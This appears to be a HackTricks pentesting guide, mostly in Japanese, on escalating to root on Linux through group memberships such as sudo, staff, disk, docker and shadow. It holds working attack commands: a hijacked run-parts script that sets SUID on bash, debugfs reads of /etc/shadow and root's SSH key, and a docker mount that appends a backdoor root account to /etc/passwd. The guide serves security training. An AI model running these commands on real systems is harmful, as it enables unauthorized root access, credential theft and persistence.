# Interesting Groups - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Sudo/Admin グループ

### **PE - Method 1**

**場合によっては**、システムの **/etc/sudoers** ポリシー（またはそこから include されたファイル）に、次のようなエントリが含まれていることがあります。<sup>[[3]](#references)</sup>
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
これは、いずれかのエントリに一致するユーザーが、`sudo` を介して任意の対象ユーザーとして任意のコマンドを実行できることを意味します（ポリシーのその他の条件に従います）。<sup>[[3]](#references)</sup>

この場合、**root になるには次を実行するだけです**:
```
sudo su
```
### PE - Method 2

すべての suid バイナリを検索し、**Pkexec** バイナリが存在するか確認します：
```bash
find / -perm -4000 2>/dev/null
```
**pkexec が SUID binary の場合**、polkit が要求された action を authorize したときにのみ、別の user として program を実行できます。SUID bit だけでは root になることは保証されません。**sudo** または **admin** の membership で十分だと決めつけず、インストールされている policy と対象 session の authorization を確認してください。<sup>[[4]](#references)[[5]](#references)</sup>

古い Local Authority backend を現在も使用している distribution では、次のコマンドで group rules を確認します。
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
関連するグループ名とデフォルト設定はディストリビューションによって異なります。この文脈でグループが有用なのは、ローカルポリシーでそのグループが指定されている場合のみです。<sup>[[5]](#references)</sup>

**root になるには次を実行できます**:
```bash
pkexec "/bin/sh" #Authentication is required according to the local policy
```
**pkexec** を実行しようとして、次の **error** が表示された場合:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
認証 agent が登録されていない SSH session では、policy が本来その action を許可している場合でも、`pkexec` が次の error で失敗することがあります。polkit では、desktop 以外の session 向けの text authentication agent として `pkttyagent` が文書化されています。正確な挙動は version や distribution に依存するため、local の policy と agent の設定を確認してください。影響を受ける NixOS の version で報告されている workaround では、**2つの異なる SSH session** を使用します。<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>
```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
## Wheel Group

sudoersポリシーに次のエントリが含まれている場合もあります：
```
%wheel	ALL=(ALL:ALL) ALL
```
これは、そのエントリに一致するすべてのユーザーが、`sudo` を通じて任意の対象ユーザーとして任意のコマンドを実行できることを意味します（ポリシーのその他の条件に従います）。<sup>[[3]](#references)</sup>

この場合、**root になるには次のコマンドを実行するだけです**:
```
sudo su
```
## Shadow Group

権限によって許可されているシステムでは、**shadow** グループのユーザーは **/etc/shadow** を**読み取る**ことができます。対象で実際のモードと ACL を確認してください:<sup>[[6]](#references)[[7]](#references)</sup>
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
それでは、ファイルを読み、いくつかの **hashes を crack** してみましょう。

hashes を triage する際の、ロック状態に関する簡単な注意点:
- `!` または `*` を含むエントリは、通常、password による non-interactive login ができません。
- `!hash` は password が lock されていることを意味します。残りの文字列は、lock される前の password field を表します。
- `*` を含む field は有効な `crypt(3)` hash ではなく、UNIX-password login を防ぎます。password が以前に設定されていたかどうかを、これだけから推測してはいけません。
これは、直接 login がブロックされている場合でも、account の分類に役立ちます。<sup>[[6]](#references)</sup>

## Staff Group

**staff**: root privileges を必要とせずに、ユーザーがシステム（`/usr/local`）へローカルな変更を追加できるようにします（`/usr/local/bin` 内の executable はすべてのユーザーの PATH variable に含まれており、同名の `/bin` および `/usr/bin` 内の executable を「override」する可能性があることに注意してください）。monitoring/security との関連性がより高い group `"adm"` と比較してください。<sup>[[2]](#references)[[7]](#references)</sup>

`PATH` で `/usr/local/bin` が `/usr/bin` より先に指定されている Debian configurations（以下の例など）では、修飾されていない command は最初に `/usr/local/bin` の copy に解決されます。target 上で有効な `PATH` を確認してください。
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
特権プロセスが書き込み可能な `/usr/local/bin` を通じて修飾なしのコマンドを解決する場合、そのコマンドを置き換えることでプロセスの権限で実行させられる可能性があります。テストする前に、実際のパスとトリガーを確認してください。

Ubuntu システムでは、ログイン時に `pam_motd` が root として `run-parts --lsbsysinit` 経由で実行可能なスクリプトを実行します。cron ジョブでも `run-parts` が使用される場合がありますが、これはディストリビューションと設定に依存します。<sup>[[10]](#references)[[11]](#references)</sup>
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
新しい SSH ログイン時に、`pspy` はこのパスが実際に target 上で呼び出されているかの確認に役立ちます。root 権限なしでプロセスのコマンドラインを監視できます。<sup>[[10]](#references)[[12]](#references)</sup>
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**Exploit**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## Disk Group

**disk** グループのメンバーシップにより、ブロックデバイスへの raw access が可能になり、しばしば **root access に近い状態** になることがあります。Debian では、これはほぼ root と同等と説明されていますが、対象上の実際のデバイス権限とストレージレイアウトを確認してください。<sup>[[7]](#references)</sup>

一般的なデバイスパスには `/dev/sd*` などがありますが、NVMe やその他のストレージレイアウトでは異なる名前が使用されます。
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
`debugfs`はext2/ext3/ext4ファイルシステム上で動作します。上記の`/root`や`/etc/shadow`などのパスは開かれたファイルシステム内のファイルを指し、`dump`の2番目の引数はネイティブファイルシステム上の出力先パスです。<sup>[[8]](#references)</sup> 例えば、次のコマンドは開かれたファイルシステムから`/tmp/asd1.txt`を抽出し、ネイティブファイルシステム上の`/tmp/asd2.txt`に保存します:
```bash
debugfs /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
`-w` オプションはファイルシステムを読み書き可能な状態で開き、`write` コマンドはネイティブファイルを開いたファイルシステム内にコピーします。直接編集するとファイルシステムが破損する可能性があるため、マウントされた稼働中のファイルシステムでは使用せず、可能な場合はオフラインイメージ上で作業してください。<sup>[[8]](#references)</sup>
```bash
debugfs -w /dev/sda1
debugfs:  write /tmp/asd1.txt /tmp/asd2.txt
```
## Video Group

`w`コマンドを使用すると、**システムにログインしているユーザー**を確認でき、次のような出力が表示されます。<sup>[[20]](#references)</sup>
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1** エントリは、Linux 仮想コンソールの 1 つ目を識別します。ただし、特にコンテナやその他の環境では、それだけでユーザーが物理的にマシンの前にいることを証明するものではありません。<sup>[[21]](#references)</sup>

読み取り可能な framebuffer デバイスを公開しているシステムでは、**video** グループのメンバーシップによって、そのデバイスへのアクセスが許可される場合があります。Linux framebuffer インターフェースのドキュメントでは、`/dev/fb0` は画面のスナップショット用にコピーできる読み取り可能なメモリデバイスとして説明されています。`/sys/class/graphics/fb0/virtual_size` パスは、その fbdev sysfs 属性が存在する環境でのみ利用できるため、まず対象を確認してください。<sup>[[7]](#references)[[9]](#references)</sup>
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
インストールされている **GIMP** バージョンが raw-data importer を提供している場合は、その importer で **`screen.raw`** を開きます。サポート状況と操作項目は、バージョンや plug-in によって異なります。<sup>[[22]](#references)</sup>

![Disk Group - Video Group: raw image を開くには GIMP を使用し、screen.raw ファイルを選択して、ファイル形式として Raw image data を選択します](<../../../images/image (463).png>)

画像の Width と Height を framebuffer のジオメトリに合わせて設定し、出力が判読できるようになるまで、利用可能な pixel formats/Image Types を試します。<sup>[[9]](#references)</sup>

![Disk Group - Video Group: Width と Height を画面で使用されている値に変更し、異なる Image Types を確認します（画面が最も見やすく表示されるものを選択します）](<../../../images/image (317).png>)

## Root Group

**root** group のメンバーであっても root の UID が与えられるわけではありません。ただし、`root` が所有する group-writable ファイルは、特権サービスや library がそれらを使用する場合、興味深い対象になる可能性があります。privilege-escalation path として扱う前に、ファイルの実際の permissions と使用方法を確認してください。

**root メンバーが変更できるファイルを確認する**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Docker グループ

標準的な rootful インストールでは、`docker` グループへの所属により、Docker daemon への root-level access が付与されます。bind mount はデフォルトで read-write であるため、その daemon を制御できるユーザーは、ホストの `/` をコンテナに mount してホスト上のファイルを変更できます。これは実質的にホスト上の root access を与えます。<sup>[[13]](#references)[[14]](#references)[[15]](#references)</sup>
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bash
```
最後に、前述の提案のどれも気に入らない場合や、何らかの理由（Docker API firewall など）で機能しない場合は、こちらで説明されているように、**privileged container を実行してそこから escape する**こともできます。

{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

Docker socket に対する write permissions がある場合は、[**Docker socket を悪用して privileges を escalate する方法についてのこの記事**](../../1-linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)**を読んでください。**

{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}

{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## lxc/lxd Group

{{#ref}}
./
{{#endref}}

## Adm Group

通常、**`adm`** group の**members**には、_/var/log/_ 内にある **log** files を**read**する permissions があります。\
したがって、この group に属する user を compromise した場合は、必ず**logs を確認**すべきです。<sup>[[7]](#references)</sup>

## Backup / Operator / lp / Mail groups

これらの groups は、service や distribution に固有の意味を持ちます。Debian では、委任された backup/restore に `backup`、printer daemons に `lp`、`/var/mail` に `mail` を使用することが文書化されているため、membership を privilege path と見なす前に、ローカルの permissions を確認してください。<sup>[[7]](#references)</sup>

これらは直接的な root vectors というより、**credential-discovery** vectors であることがよくあります。
- **backup**: configs、keys、DB dumps、tokens を含む archives を expose する可能性があります。
- **operator**: sensitive な runtime data を leak する可能性がある、platform-specific な operational access です。
- **lp**: print queues/spools に document contents が含まれている可能性があります。
- **mail**: mail spools から reset links、OTPs、internal credentials が expose される可能性があります。

ここでの membership は high-value data exposure finding として扱い、password/token reuse を通じて pivot してください。

## Auth group

OpenBSD では、S/Key が configured されている場合、`/etc/skey` は `root:auth` が所有しており、その records への access には group `auth` が必要です。YubiKey records は `/var/db/yubikey` に保存されます。<sup>[[16]](#references)[[17]](#references)</sup> S/Key または YubiKey が enabled になっている脆弱な OpenBSD 6.6 configuration では、`auth` privileges を持つ local users が root になることができました。Qualys は prerequisite と exploit chain を文書化しており、リンク先の PoC がそれを実装しています。<sup>[[18]](#references)[[19]](#references)</sup>

## References

- [1] [GUI session なしでの pkexec/pkttyagent authentication（NixOS issue #18012）](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)
- [2] [SystemGroups - Debian Wiki](https://wiki.debian.org/SystemGroups)
- [3] [sudoers(5) — sudo — Debian Manpages](https://manpages.debian.org/bookworm/sudo/sudoers.5.en.html)
- [4] [pkexec — polkit Reference Manual](https://polkit.pages.freedesktop.org/polkit/pkexec.1.html)
- [5] [polkit — polkit Reference Manual](https://polkit.pages.freedesktop.org/polkit/polkit.8.html)
- [6] [shadow(5) — Linux manual page](https://man7.org/linux/man-pages/man5/shadow.5.html)
- [7] [Debian セキュリティマニュアル](https://www.debian.org/doc/manuals/securing-debian-manual/securing-debian-manual.en.pdf)
- [8] [debugfs(8) — Linux manual page](https://www.man7.org/linux/man-pages/man8/debugfs.8.html)
- [9] [Frame Buffer Device — Linux Kernel documentation](https://docs.kernel.org/fb/framebuffer.html)
- [10] [update-motd(5) — Ubuntu Manpages](https://manpages.ubuntu.com/manpages/resolute/man5/update-motd.5.html)
- [11] [run-parts(8) — Debian Manpages](https://manpages.debian.org/unstable/debianutils/run-parts.8.en.html)
- [12] [pspy — unprivileged Linux process snooping](https://github.com/DominicBreuker/pspy)
- [13] [Docker Engine security](https://docs.docker.com/engine/security/)
- [14] [Docker を non-root user として管理する](https://docs.docker.com/engine/install/linux-postinstall)
- [15] [Running containers — Docker Docs](https://docs.docker.com/engine/containers/run/)
- [16] [skey(5) — OpenBSD manual pages](https://man.openbsd.org/skey.5)
- [17] [login_yubikey(8) — OpenBSD manual pages](https://man.openbsd.org/login_yubikey.8)
- [18] [OpenBSD における authentication vulnerabilities — Qualys Security Advisory](https://www.openwall.com/lists/oss-security/2019/12/04/5)
- [19] [openbsd-authroot — local exploit PoC](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
- [20] [w(1) — Linux manual page](https://man7.org/linux/man-pages/man1/w.1.html)
- [21] [Linux allocated devices（4.x 以降の version）](https://docs.kernel.org/6.16/admin-guide/devices.html)
- [22] [Image Import and Export — GIMP Documentation](https://docs.gimp.org/3.0/en/gimp-prefs-import-export.html)
{{#include ../../../banners/hacktricks-training.md}}
